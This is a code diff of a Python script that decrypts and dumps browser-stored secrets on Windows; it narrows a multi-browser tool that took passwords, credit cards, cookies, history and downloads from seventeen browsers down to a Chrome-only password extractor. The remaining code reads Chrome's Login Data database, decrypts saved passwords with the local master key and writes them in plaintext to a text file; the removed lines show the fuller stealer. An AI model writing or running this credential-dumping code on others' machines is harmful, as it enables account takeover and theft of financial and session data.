@@ -1,66 +1,18 @@
-import base64
-import json
 import os
-import shutil
 import sqlite3
-import sys
-from datetime import datetime, timedelta
-
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 appdata = os.getenv('LOCALAPPDATA')
 
-browsers = {
-    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
-    'amigo': appdata + '\\Amigo\\User Data',
-    'torch': appdata + '\\Torch\\User Data',
-    'kometa': appdata + '\\Kometa\\User Data',
-    'orbitum': appdata + '\\Orbitum\\User Data',
-    'cent-browser': appdata + '\\CentBrowser\\User Data',
-    '7star': appdata + '\\7Star\\7Star\\User Data',
-    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
-    'vivaldi': appdata + '\\Vivaldi\\User Data',
-    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
-    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
-    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
-    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
-    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
-    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
-    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-    'iridium': appdata + '\\Iridium\\User Data',
-}
+chrome_path = appdata + '\\Google\\Chrome\\User Data'
 
 data_queries = {
     'login_data': {
-        'query': 'SELECT action_url, username_value, password_value FROM logins',
+        'query': 'SELECT origin_url, username_value, password_value FROM logins',
         'file': '\\Login Data',
         'columns': ['URL', 'Email', 'Password'],
         'decrypt': True
-    },
-    'credit_cards': {
-        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
-        'file': '\\Web Data',
-        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
-        'decrypt': True
-    },
-    'cookies': {
-        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
-        'file': '\\Network\\Cookies',
-        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
-        'decrypt': True
-    },
-    'history': {
-        'query': 'SELECT url, title, last_visit_time FROM urls',
-        'file': '\\History',
-        'columns': ['URL', 'Title', 'Visited Time'],
-        'decrypt': False
-    },
-    'downloads': {
-        'query': 'SELECT tab_url, target_path FROM downloads',
-        'file': '\\History',
-        'columns': ['Download URL', 'Local Path'],
-        'decrypt': False
     }
 }
 
@@ -92,12 +44,10 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
     return decrypted_pass
 
 
-def save_results(browser_name, type_of_data, content):
-    if not os.path.exists(browser_name):
-        os.mkdir(browser_name)
+def save_results(type_of_data, content):
     if content is not None:
-        open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
-        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
+        open(f'chrome_passwords.txt', 'w', encoding="utf-8").write(content)
+        print(f"\t [*] Saved passwords in chrome_passwords.txt")
     else:
         print(f"\t [-] No Data Found!")
 
@@ -117,43 +67,20 @@ def get_data(path: str, profile: str, key, type_of_data):
             for i in range(len(row)):
                 if isinstance(row[i], bytes):
                     row[i] = decrypt_password(row[i], key)
-        if data_type_name == 'history':
-            if row[2] != 0:
-                row[2] = convert_chrome_time(row[2])
-            else:
-                row[2] = "0"
         result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
     conn.close()
     os.remove('temp_db')
     return result
 
 
-def convert_chrome_time(chrome_time):
-    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
-
-
-def installed_browsers():
-    available = []
-    for x in browsers.keys():
-        if os.path.exists(browsers[x]):
-            available.append(x)
-    return available
-
-
 if __name__ == '__main__':
-    available_browsers = installed_browsers()
+    master_key = get_master_key(chrome_path)
+    print(f"Getting Stored Passwords from Google Chrome")
 
-    for browser in available_browsers:
-        browser_path = browsers[browser]
-        master_key = get_master_key(browser_path)
-        print(f"Getting Stored Details from {browser}")
+    for data_type_name, data_type in data_queries.items():
+        print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
+        data = get_data(chrome_path, "Default", master_key, data_type)
+        save_results(data_type_name, data)
+        print("\t------\n")
 
-        for data_type_name, data_type in data_queries.items():
-            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
-            data = get_data(browser_path, "Default", master_key, data_type)
-            save_results(browser, data_type_name, data)
-            print("\t------\n")
-
-
-
-input("Appuyez sur une touche pour quitter...)
+input("Press any key to exit...")
